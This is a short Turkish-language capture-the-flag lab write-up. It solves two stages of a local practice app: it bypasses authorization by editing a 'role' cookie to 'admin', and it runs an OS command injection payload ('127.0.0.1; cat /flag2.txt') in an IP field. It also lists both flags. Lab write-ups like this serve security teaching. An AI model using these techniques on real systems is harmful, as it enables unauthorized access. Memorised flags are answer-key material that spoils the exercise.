# 📝 Lab Çözüm Dokümantasyonu (Write-up)

## 🚩 1. Aşama: Yetki Atlama (Cookie Tampering)
1. `http://localhost:5000` adresi ziyaret edilir.
2. `F12` -> Storage -> Cookies sekmesinde `role` değeri `admin` yapılır ve F5 basılır.
3. **FLAG 1:** `TUGA{c00k1e_m4n1pul4s1y0nu_v3_y3tk1_yuk53ltm3}`

## 🚩 2. Aşama: Komut Enjeksiyonu (OS Command Injection)
1. IP kutusuna şu yazılır: `127.0.0.1; cat /flag2.txt`
2. **FLAG 2:** `TUGA{k0mut_3nj3ks1y0nu_v3_r00t_3r1s1m1}`
